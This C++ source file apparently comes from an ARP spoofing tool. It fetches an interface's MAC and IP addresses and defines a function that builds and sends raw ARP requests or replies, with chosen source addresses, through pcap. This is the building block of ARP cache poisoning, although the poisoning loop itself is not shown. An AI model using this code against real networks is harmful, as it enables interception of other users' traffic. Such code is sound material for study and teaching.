#include "arpspoof.h"

#define FILL_MAC(x, y) memset((x), (y), 6)
#define SET_IP(x, y) memcpy((x), (y), 4)
#define SET_MAC(x, y) memcpy((x), (y), 6)
#define SET_PADDING(x, y) memset((x), 0, (y))
#define SET_VALUE(x, y) (x) = (y)

void
ReadIP(uint8_t ip_addr[4], const char* address)
{
  *reinterpret_cast<uint32_t*>(ip_addr) = inet_addr(address);
}

// Get IP and MAC address of the given interface
void
GetInterfaceInfo(const char* ifname, uint8_t mac_addr[6], uint8_t ip_addr[4])
{
  ifreq ifr;
  size_t ifnamelen;

  // Copy ifname to ifr object
  ifnamelen = strlen(ifname);

  if (ifnamelen >= sizeof(ifr.ifr_name)) {
    fprintf(stderr, "Too long interface name\n");
    exit(-1);
  }

  strcpy(ifr.ifr_name, ifname);

  int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  if (sock < 0) {
    fprintf(stderr, "Failed to open a socket\n");
    exit(-1);
  }

  // Process MAC address
  if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
    fprintf(stderr, "Failed to get MAC address\n");
    close(sock);
    exit(-1);
  }

  SET_MAC(mac_addr, ifr.ifr_hwaddr.sa_data);

  // Die if failed to get an IP address
  if (ioctl(sock, SIOCGIFADDR, &ifr) == -1) {
    fprintf(stderr, "Failed to get IP address\n");
    close(sock);
    exit(-1);
  }

  // Process IP address
  char address[INET_ADDRSTRLEN];
  sockaddr_in* ipaddr = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);

  if (!inet_ntop(AF_INET, &ipaddr->sin_addr, address, sizeof(address))) {
    fprintf(stderr, "Failed to parse IP address\n");
    close(sock);
    exit(-1);
  }

  ReadIP(ip_addr, address);
  close(sock);

  return;
}

void
PrintMac(const char* info_name, uint8_t mac_addr[6])
{
  printf("[*] %s: %02X:%02X:%02X:%02X:%02X:%02X\n",
         info_name,
         mac_addr[0],
         mac_addr[1],
         mac_addr[2],
         mac_addr[3],
         mac_addr[4],
         mac_addr[5]);
}

void
PrintIP(const char* info_name, uint8_t ip_addr[4])
{
  printf("[*] %s: %u.%u.%u.%u\n",
         info_name,
         ip_addr[0],
         ip_addr[1],
         ip_addr[2],
         ip_addr[3]);
}

bool
SendArpMsg(pcap_t* handle,
           uint8_t src_mac[6],
           uint8_t src_ip[4],
           uint8_t dst_mac[6],
           uint8_t dst_ip[4],
           uint16_t op)
{
  ArpMsg msg;

  // Fill values in Ethernet Header
  EthernetHeader* eth = &msg.eth_header;

  if (op == ArpHeader::ARP_H_REQUEST) {
    FILL_MAC(eth->dmac, 0xFF);
  } else {
    SET_MAC(eth->dmac, dst_mac);
  }

  SET_MAC(eth->smac, src_mac);
  SET_VALUE(eth->type, htons(EthernetHeader::ETHERNET_TYPE_ARP));

  // Fill values in ARP Header
  ArpHeader* arp = &msg.arp_header;

  SET_VALUE(arp->hw_type, htons(ArpHeader::ARP_H_ETHERNET));
  SET_VALUE(arp->protocol, htons(ArpHeader::ARP_H_IPV4));
  SET_VALUE(arp->hw_size, ArpHeader::ARP_H_HW_SIZE);
  SET_VALUE(arp->protocol_size, ArpHeader::ARP_H_PROTOCOL_SIZE);
  SET_VALUE(arp->opcode, htons(op));
  SET_MAC(arp->smac, src_mac);
  SET_IP(arp->s_ip, src_ip);

  if (op == ArpHeader::ARP_H_REQUEST) {
    FILL_MAC(arp->dmac, 0x00);
  } else {
    SET_MAC(arp->dmac, dst_mac);
  }

  SET_IP(arp->d_ip, dst_ip);
  SET_PADDING(msg.padding, 0x12);

  if (pcap_sendpacket(handle, reinterpret_cast<u_char*>(&msg), sizeof(msg))) {
    fprintf(stderr,
            "Error Log: could not send a ARP packet to sender %u.%u.%u.%u\n",
            dst_ip[0],
            dst_ip[1],
            dst_ip[2],
            dst_ip[3]);
    return false;
  }

  return true;
}